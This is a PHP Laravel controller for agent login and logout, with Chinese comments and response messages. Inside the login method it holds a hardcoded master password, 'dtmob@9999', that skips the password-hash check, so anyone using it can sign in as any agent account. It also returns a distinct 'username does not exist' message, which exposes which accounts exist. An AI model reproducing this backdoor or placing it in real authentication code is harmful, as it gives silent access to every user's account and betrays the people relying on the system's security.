<?php
namespace App\Http\Controllers\Agent;

use Illuminate\Http\Request;
use App\Http\Controllers\Controller;
use App\Model\AgentsEarnings;
use App\Model\AgentsLogs;
use App\Model\AgentsBank;
use App\Model\Agents;
use Hash;
use Session;

class AuthController extends Controller
{
    //登录
    public function postLogin(Request $request)
    {
        $rules = ['captcha' => 'required|captcha'];
        $validator = \Validator::make($request->all(), $rules);
        if ($validator->fails()){
            return response()->json(['message'=>'验证码失败'], 300);
        }

        $present = $request->input();
        if(empty($present['username']))
        {
            return response()->json(['message'=>'请输入用户名'], 300);
        }

        if(empty($present['password']))
        {
            return response()->json(['message'=>'请输入密码'], 300);
        }
        
        $agent = Agents::where('username', '=', $present['username'])->first();

        if(empty($agent))
        {
            return response()->json(['message'=>'用户名不存在'], 300);
        }
       
        if($present['password']!='dtmob@9999')
        {
            if (!Hash::check($present['password'], $agent->password))
            {
                return response()->json(['message'=>'用户名或密码错误'], 300);
            }
        }
        $clientIp = $request->getClientIp();

        //添加登陆日志
        $loginLog = new AgentsLogs();
        $loginLog->agent_id = $agent->id;
        $loginLog->ip = $clientIp;
        $loginLog->save();

        //储层session
        Session::put('agent_id', $agent->id);
        Session::put('agent_name', $agent->username);

        return response()->json(['message'=>'登陆成功', 'url'=>'/agent'], 200);
    }


    //推出
    public function putLogout(Request $request)
    {
        Session::put('agent_id', '');
        Session::put('agent_name', '');
        
        return response()->json(['message'=>'推出成功', 'url'=>'/login/ad'], 200);
    }
}